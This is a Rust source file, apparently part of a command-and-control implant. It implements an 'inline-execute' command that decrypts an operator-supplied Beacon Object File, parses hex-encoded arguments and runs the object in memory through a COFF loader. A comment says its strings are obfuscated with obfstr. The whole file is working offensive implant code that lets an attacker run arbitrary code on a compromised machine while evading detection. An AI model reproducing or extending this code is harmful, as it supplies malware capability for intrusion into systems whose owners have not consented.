use crate::app::{client::Client, coff_loader};
use fmtools::format; // using obfstr to obfuscate

// Parse a string of hexadecimal arguments into a Vec<u8>
fn unhexlify_args(value: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if value.len() % 2 != 0 {
        return Err(format!("Invalid argument hexadecimal string").into());
    }

    let bytes: Result<Vec<u8>, _> = (0..value.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&value[i..i + 2], 16))
        .collect();

    Ok(bytes?)
}

pub(crate) fn inline_execute(args: &[String], client: &Client) -> String {
    let encrypted_bof = &args[0];
    let entrypoint = args[1].clone();
    let hex_args = &args[2];

    if encrypted_bof.is_empty() || entrypoint.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.");
    }

    // Parse arguments
    let args = match unhexlify_args(hex_args) {
        Ok(args) => args,
        Err(_e) => return format!("Failed to parse arguments: "{_e}),
    };

    // Decrypt the BOF
    let bof = match client.decrypt_and_decompress(encrypted_bof) {
        Ok(bof) => bof,
        Err(_e) => return format!("Failed to decrypt BOF: "{_e}),
    };

    match coff_loader::Coffee::new(&bof).unwrap().execute(
        Some(args.as_ptr()),
        Some(args.len()),
        &Some(entrypoint),
    ) {
        Ok(result) => format!("BOF file executed! Output:\n"{result}),
        Err(_e) => format!("Failed to execute BOF: "{_e}),
    }
}
